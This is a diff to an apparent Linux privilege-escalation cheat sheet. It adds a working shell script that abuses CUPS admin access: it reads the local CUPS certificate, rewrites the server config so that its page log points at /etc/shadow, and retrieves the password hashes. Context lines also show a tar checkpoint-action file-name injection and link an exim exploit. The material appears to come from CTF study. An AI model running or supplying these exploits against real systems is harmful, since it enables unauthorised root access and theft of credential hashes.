@@ -792,3 +792,14 @@ touch /home/user/--checkpoint-action=exec=payload_file
 ### exploiting exim-4.84-3 Examples taken from -> https://tryhackme.com/room/linuxprivesc
 
 https://www.exploit-db.com/exploits/39535
+
+### Privilege escalation lpadmin => root by exploiting cups
+https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=692791
+
+```
+#!/bin/sh
+set -e
+AUTH="Authorization: Local $(cat /var/run/cups/certs/0)"
+curl -X POST http://localhost:631/admin/ -H "$AUTH" -H "Cookie: org.cups.sid=" -d "OP=config-server&org.cups.sid=&SAVECHANGES=1&CUPSDCONF=Listen localhost:631%0APageLog /etc/shadow"
+curl http://localhost:631/admin/log/page_log
+```
